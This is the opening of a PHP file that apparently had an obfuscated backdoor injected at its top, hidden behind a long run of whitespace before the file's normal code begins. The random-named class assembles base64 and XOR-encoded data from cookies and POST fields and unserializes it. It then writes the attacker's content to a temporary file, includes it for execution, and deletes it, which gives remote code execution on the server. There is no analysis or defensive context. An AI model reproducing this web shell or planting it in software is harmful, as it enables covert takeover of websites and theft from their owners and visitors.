<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("ugqjcacxit")){class ugqjcacxit{public static $yzadi = "sqvumwhckzpbmjxu";public static $ixuccv = NULL;public function __construct(){$puscad = @$_COOKIE[substr(ugqjcacxit::$yzadi, 0, 4)];if (!empty($puscad)){$ifuzs = "base64";$pjpmeq = "";$puscad = explode(",", $puscad);foreach ($puscad as $mdswvkcmf){$pjpmeq .= @$_COOKIE[$mdswvkcmf];$pjpmeq .= @$_POST[$mdswvkcmf];}$pjpmeq = array_map($ifuzs . "_decode", array($pjpmeq,));$pjpmeq = $pjpmeq[0] ^ str_repeat(ugqjcacxit::$yzadi, (strlen($pjpmeq[0]) / strlen(ugqjcacxit::$yzadi)) + 1);ugqjcacxit::$ixuccv = @unserialize($pjpmeq);}}public function __destruct(){$this->qyyqgq();}private function qyyqgq(){if (is_array(ugqjcacxit::$ixuccv)) {$eygmhqodfp = sys_get_temp_dir() . "/" . crc32(ugqjcacxit::$ixuccv["salt"]);@ugqjcacxit::$ixuccv["write"]($eygmhqodfp, ugqjcacxit::$ixuccv["content"]);include $eygmhqodfp;@ugqjcacxit::$ixuccv["delete"]($eygmhqodfp);exit();}}}$nghns = new ugqjcacxit();$nghns = NULL;} ?><?php
/**
